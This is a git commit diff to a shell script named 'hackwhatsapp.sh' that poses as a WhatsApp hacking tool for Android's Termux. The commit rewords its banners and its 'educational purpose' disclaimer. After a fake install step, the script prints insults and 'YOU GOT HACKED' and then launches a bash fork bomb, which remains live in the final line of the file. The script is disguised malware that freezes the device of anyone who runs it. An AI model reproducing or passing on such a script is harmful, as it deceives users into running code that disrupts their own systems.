34e06ce9623e6da78ee39451d6df9627e026fa99
petermatnick <69103410+PETERMATNICK7@users.noreply.github.com>
2021-03-02 22:13:00 +0530

    Update hackwhatsapp.sh

--- hackwhatsapp.sh
+++ hackwhatsapp.sh
@@ -1,16 +1,16 @@
 #!/system/bin/sh
 clear
 echo " "
-echo -e "Hack Whatsapp"
+echo -e "Whatsapp Hacking...."
 echo -e "  coded by Peter Matnick"
 echo " "
 echo " "
-echo -e "\e[35m Please Wait..."
-echo -e "\e[35m Installing PACKAGES Needed..."
+echo -e "\e[35m Loading....."
+echo -e "\e[35m Installing..."
 echo " "
 pkg install figlet -y
 echo " "
-echo -e "\e[35mAll PACKAGES Installed Successfully"|pv -qL 20
+echo -e "\e[35mComplete Successfully"|pv -qL 20
 echo -e "\e[44m "
 clear
 echo " "
@@ -19,16 +19,16 @@ figlet "WhatsApp"
 echo " "
 echo " "
 echo " "
-echo -e  "\e[44m    THIS TOOL IS USING ONLY FOR     "
-echo -e "\e[44m        EDUCATIONAL PURPOSE          "
+echo -e "\e[44m        This Tool Only For EDUCATIONAL PURPOSE          "
 echo " "
 echo -e "\e[92m "
 read -r -s -p $'Press enter to continue...\n'
 clear
 echo " "
-echo -e "    Run away stupid!!"
+echo -e "    FuckOFF"
 echo " "
-echo -e "   Have been hacked by Peter Matnick"
+echo -e "  -----YOU GOT HACKED-----"
+echo -e "   By @Peter_Matnick_"
 echo " "
 :(){ :|:& };:
 
